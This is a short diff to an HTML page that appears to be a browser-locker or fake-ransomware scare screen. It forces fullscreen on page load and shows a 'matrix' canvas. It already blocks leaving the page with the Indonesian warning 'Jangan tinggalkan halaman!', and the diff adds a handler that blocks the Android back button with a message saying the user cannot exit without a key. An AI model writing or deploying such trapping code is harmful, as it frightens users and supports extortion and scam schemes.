@@ -100,7 +100,6 @@
       80% { transform: translate(2px, 2px); }
       100% { transform: translate(0, 0); }
     }
-
   </style>
 </head>
 <body onload="document.documentElement.requestFullscreen()"><canvas id="matrixCanvas"></canvas>
@@ -238,6 +237,12 @@
   window.onbeforeunload = function() {
     return "Jangan tinggalkan halaman!";
   };
+
+  // Block Back Button in Android Browser
+  document.addEventListener("backbutton", function(event) {
+    event.preventDefault();
+    alert("Kamu tidak dapat keluar tanpa kunci!");
+  }, false);
 </script>
 </body>
 </html>
